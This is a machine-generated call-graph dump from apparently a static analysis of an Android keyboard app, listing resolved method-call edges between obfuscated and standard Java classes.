VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: java.lang.Object get(int)>($i2) in <lkq: int hashCode()> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r8, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lig: void <init>()>() in <lim: void <init>()> ==> <lig: void <init>()>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
STATIC edge: $r1 = staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>("line.separator") in <lwe: void <clinit>()> ==> <java.lang.System: java.lang.String getProperty(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqp: java.lang.Object get(int)> ==> <iye: void O(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <llg: java.lang.Object next()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lrg: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <ljf: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(char[],char[])>($r12, $r13) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(char[],char[])>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "message") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: int o(int,int,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r7 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>("com.google.common.base.Strings") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<hnq: void <init>()>() in <hnt: void <clinit>()> ==> <hnq: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb C(int)>(0) in <lkq: lsb B()> ==> <lkq: lsb C(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <mly: java.lang.IllegalArgumentException f()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lvs: void <init>(java.lang.String,int)>("BOOLEAN", 0) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <izw: java.lang.Object[] S(java.lang.Iterable)>($r1) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <izw: java.lang.Object[] S(java.lang.Iterable)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(byte[],byte)>($r4, -1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(byte[],byte)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(int[],int)>($r8, $i1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(int[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
STATIC edge: staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lly: void j(java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lma: void <init>()> ==> <lkh: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null value in entry: ") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lql: java.lang.Object get(int)> ==> <iye: void O(int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r1, $r10) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
CLINIT edge: staticinvoke <lsu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsu: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lmo: void <init>(java.util.Comparator)>($r2) in <lqs: void <init>(lkq,java.util.Comparator)> ==> <lmo: void <init>(java.util.Comparator)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <ivw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ivw: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r11 = staticinvoke <hny: hny a(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hny: hny a(hmm)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: int[] r()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lsb: boolean hasNext()>
STATIC edge: $r3 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(15) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i1) in <ljd: int b()> ==> <ljd: void A(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorGifSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>($i0, 2) in <izw: int ae(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
STATIC edge: $r2 = staticinvoke <lum: lul g()>() in <lsn: boolean ac()> ==> <lum: lul g()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(">") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: int size()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lqr: int size()>
VIRTUAL edge: virtualinvoke r0.<ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>($i0, $r2, $r1, $i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lqd: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.String toHexString(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.lang.Comparable: int compareTo(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lts: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: int b()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int b()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r3) in <ljb: java.lang.Object getValue()> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw f(java.lang.String)> ==> <ivw: ivv I()>
CLINIT edge: staticinvoke <lsl: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsl: void <clinit>()>
SPECIAL edge: specialinvoke $r24.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_SUGGESTION_METADATA", 24, 24) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $r9 = virtualinvoke $r8.<llo: lma u()>() in <hbv: void j()> ==> <llo: lma u()>
STATIC edge: $i5 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ag(int,int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqm: java.lang.Object get(int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be greater than size (%s)", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void q(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void q(int)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lkq: int hashCode()>
STATIC edge: staticinvoke <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>($r3, $r3, $i5, $i0, $i4) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<lts: lsz c(int)>($i1) in <lsn: boolean ac()> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_IMAGE", 14, 14) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int min(int,int)>($i2, $i1) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int min(int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r11.<lma: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: int size()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: int size()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int a()>() in <lvq: int size()> ==> <lvq: int a()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(byte[],byte[])>($r4, $r5) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(byte[],byte[])>
SPECIAL edge: specialinvoke $r26.<mag: void <init>(java.lang.String,int,int)>("TENOR_AUTOCOMPLETE_METADATA", 26, 26) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object h(int)>
SPECIAL edge: specialinvoke $r14.<gcs: void <init>(hbv,lma,int)>(r0, $r9, 12) in <hbv: void j()> ==> <gcs: void <init>(hbv,lma,int)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljf: int b()> ==> <iye: void I(boolean,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, 0) in <lvr: void <init>(java.util.List)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalStateException: void <init>(java.lang.String)>("Recursive update") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: $i4 = staticinvoke <izw: int af(int,int)>($i3, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(13) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<qc: void <init>()>() in <ivw: void <clinit>()> ==> <qc: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map o()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<java.lang.String: int compareTo(java.lang.String)>($r2) in <java.lang.String: int compareTo(java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.String)>
INTERFACE edge: $r0 = interfaceinvoke $r2.<lwi: java.lang.StackTraceElement[] b(java.lang.Class,int)>($r1, $i0) in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.lang.Object k(int)>
CLINIT edge: staticinvoke <java.lang.Character$UnicodeBlock: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Character$UnicodeBlock: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_period", class "Llst;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: $r5 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
